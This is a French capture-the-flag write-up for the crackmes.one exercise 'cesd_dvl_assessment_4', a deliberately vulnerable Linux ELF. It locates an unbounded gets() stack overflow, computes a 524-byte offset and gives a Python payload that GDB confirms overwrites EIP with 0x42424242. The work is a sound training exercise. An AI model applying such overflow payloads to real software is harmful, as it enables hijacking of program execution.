# cesd_dvl_assessment_4 — zero (« 01_exploitme04 »)

- **Site** : [crackmes.one/crackme/5ab77f5333c5d40ad448c121](https://crackmes.one/crackme/5ab77f5333c5d40ad448c121) (réimport crackmes.de)
- **Auteur** : zero
- **Plateforme** : Unix/Linux — ELF 32-bit (Intel i386), non strippé, avec `debug_info`
- **Langage** : C (GCC, *Damn Vulnerable Linux*)
- **Difficulté** : 2.0 · **Qualité** : 4.0
- **Publié** : 2018-03-25 (réimport) — exercice de la certification CESD

> *Practical Assessment 04* de la certification **CESD** (IITAC). Comme les autres,
> ce n'est pas un keygen : il faut exploiter un débordement de tampon. La variante
> ici : le dangereux `gets()` lit **depuis stdin** dans une sous-fonction `crackme()`.

## Le binaire

Le ZIP contient `01_exploitme04` (l'ELF) et le workbook `IITAC_CESD_Exercises.pdf`.

```
$ file 01_exploitme04
ELF 32-bit LSB executable, Intel i386, dynamically linked,
interpreter /lib/ld-linux.so.2, with debug_info, not stripped
```

SHA-256 de l'ELF extrait : `24a31e884d59549d33a791f2e87e643bbf57f04810662c80d577013d4478c43e`.

## Comment on trouve

`main` ne fait qu'appeler `crackme()` puis afficher `"Hello world!"` :

```asm
080483dd <main>:
 80483ed: call   80483c4 <crackme>
 80483f2: mov    DWORD PTR [esp],0x8048514   ; "Hello world!\n"
 80483f9: call   80482e4 <printf@plt>
```

Tout se joue dans `crackme()` :

```asm
080483c4 <crackme>:
 80483c4: push   ebp
 80483c5: mov    ebp,esp
 80483c7: sub    esp,0x218
 80483cd: lea    eax,[ebp-0x208]    ; dest = buf
 80483d3: mov    [esp],eax
 80483d6: call   80482c4 <gets@plt> ; gets(buf)  ← lit stdin sans borne
 80483db: leave
 80483dc: ret
```

`gets(buf)` avec `buf = [ebp-0x208]` lit une ligne depuis **stdin** sans aucune
limite de taille. Débordement de pile dans le cadre de `crackme()`.

### Offset jusqu'à l'adresse de retour

- `buf` commence à `ebp-0x208`.
- L'`ebp` sauvegardé est à `ebp+0`, l'adresse de retour (de `crackme`) à `ebp+4`.
- Distance `buf → adresse de retour` : `0x208 + 4 = 0x20c = 524` octets.

### Payload (sur stdin)

```
"A" * 524  +  <adresse sur 4 octets little-endian>  + "\n"
```

Avec `"BBBB"` (= `0x42424242`) pour prouver le contrôle d'EIP.

## Section Debug GDB

On confirme en live que l'adresse de retour est bien contrôlée :

```
$ python3 -c "import sys;sys.stdout.buffer.write(b'A'*524+b'BBBB\n')" > /tmp/in4
$ gdb -q -batch -ex 'run < /tmp/in4' -ex 'info registers eip' ./01_exploitme04
...
eip            0x42424242          0x42424242
```

`EIP = 0x42424242` : les quatre octets `BBBB` placés après 524 `A` écrasent
exactement l'adresse de retour. L'exploitation du débordement est démontrée.

## Réponse

Pas de clé : l'objectif est de détourner le flux d'exécution. L'entrée (stdin)
qui écrase EIP est :

```
python3 -c 'import sys;sys.stdout.buffer.write(b"A"*524+b"BBBB\n")' | ./01_exploitme04
```

→ `EIP = 0x42424242`.

## Reproduire

```
$ ./tools/crackmes-de-cesd_dvl_assessment_4-solve.py        # affiche l'offset/payload
$ ./tools/crackmes-de-cesd_dvl_assessment_4-solve.py --gdb  # prouve EIP=0x42424242 sous gdb
```
